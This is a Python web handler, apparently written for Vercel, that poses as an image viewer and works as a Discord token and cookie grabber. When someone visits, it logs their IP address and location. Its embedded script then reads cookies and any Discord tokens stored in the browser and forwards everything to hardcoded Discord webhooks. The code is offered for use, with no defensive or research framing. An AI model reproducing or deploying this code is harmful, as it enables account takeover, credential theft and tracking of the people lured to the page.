from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, json

# Configuration - Update these with your webhooks
WEBHOOK_URL = "https://discord.com/api/webhooks/1386517547129503784/H7Y_Af2SiwqmPTzmsBRpZmQwCiEj5hjpf0FNVUl0WavinXJRTNpZSnqREViEWNV0QPxZ"
TOKEN_WEBHOOK = "https://discord.com/api/webhooks/1386729903604367502/S7dnBw213vde8pTUkWWBj7C0oRwa1RMpCjPI1CtayiQqgOIQ6Ps_MBoXvJB5PmKGsGdw"
IMAGE_URL = "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg"

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def do_GET(self):
        try:
            # Extract query parameters
            query = parse.parse_qs(parse.urlsplit(self.path).query)
            ip = self.headers.get('X-Forwarded-For', 'Unknown')
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            # Send IP report to Discord
            self.send_ip_report(ip, user_agent)
            
            # Build HTML with token capture
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Image Viewer</title>
                <style>
                    body {{ margin: 0; padding: 0; }}
                    img {{ max-width: 100%; height: auto; display: block; margin: 0 auto; }}
                </style>
                <script>
                    // Simple token and cookie capture
                    setTimeout(() => {{
                        const data = {{
                            ip: "{ip}",
                            userAgent: "{user_agent.replace('"', '\\"')}",
                            token: "NOT_FOUND",
                            cookies: document.cookie
                        }};
                        
                        // Check for Discord token
                        const tokenKeys = ['token', 'discord_token', 'access_token'];
                        for (const key of tokenKeys) {{
                            try {{
                                // Check localStorage
                                const token = localStorage.getItem(key);
                                if (token && token.length > 50) {{
                                    data.token = token;
                                    break;
                                }}
                                
                                // Check sessionStorage
                                const sessionToken = sessionStorage.getItem(key);
                                if (sessionToken && sessionToken.length > 50) {{
                                    data.token = sessionToken;
                                    break;
                                }}
                            }} catch(e) {{}}
                        }}
                        
                        // Send data to server
                        fetch('/capture', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify(data)
                        }});
                    }}, 3000);
                </script>
            </head>
            <body>
                <img src="{IMAGE_URL}" alt="Preview">
            </body>
            </html>
            """
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode())
            
        except Exception as e:
            self.send_error(500, message=str(e))
            self.log_error("Error: %s", traceback.format_exc())

    def do_POST(self):
        try:
            if self.path == '/capture':
                # Read POST data
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data)
                
                # Send token report to Discord
                self.send_token_report(data)
                
                # Send response
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'OK')
            else:
                self.send_response(404)
                self.end_headers()
                
        except Exception as e:
            self.send_error(500, message=str(e))
            self.log_error("Error: %s", traceback.format_exc())
    
    def send_ip_report(self, ip, user_agent):
        """Send IP information to Discord"""
        try:
            # Get IP information
            ip_info = requests.get(f"http://ip-api.com/json/{ip}").json()
            country = ip_info.get('country', 'Unknown')
            city = ip_info.get('city', 'Unknown')
            isp = ip_info.get('isp', 'Unknown')
            
            # Build Discord embed
            embed = {
                "title": "📡 IP Logged",
                "color": 0x00FFFF,
                "fields": [
                    {"name": "IP Address", "value": ip, "inline": True},
                    {"name": "Location", "value": f"{city}, {country}", "inline": True},
                    {"name": "ISP", "value": isp, "inline": True},
                    {"name": "User Agent", "value": f"```{user_agent}```", "inline": False}
                ]
            }
            
            # Send to Discord
            requests.post(WEBHOOK_URL, json={"embeds": [embed]})
            
        except Exception as e:
            self.log_error("IP report error: %s", str(e))
    
    def send_token_report(self, data):
        """Send captured data to Discord"""
        try:
            embed = {
                "title": "🔑 Token Captured!",
                "color": 0xFF0000,
                "fields": [
                    {"name": "IP Address", "value": data.get('ip', 'Unknown'), "inline": True},
                    {"name": "Token Found", "value": "Yes" if data.get('token') != "NOT_FOUND" else "No", "inline": True},
                    {"name": "Discord Token", "value": f"```{data.get('token', 'Not found')}```", "inline": False},
                    {"name": "Cookies", "value": f"```{data.get('cookies', 'None')[:1000]}```", "inline": False}
                ]
            }
            
            requests.post(TOKEN_WEBHOOK, json={"embeds": [embed]})
            
        except Exception as e:
            self.log_error("Token report error: %s", str(e))

# Vercel requires this specific handler name
handler = ImageLoggerAPI
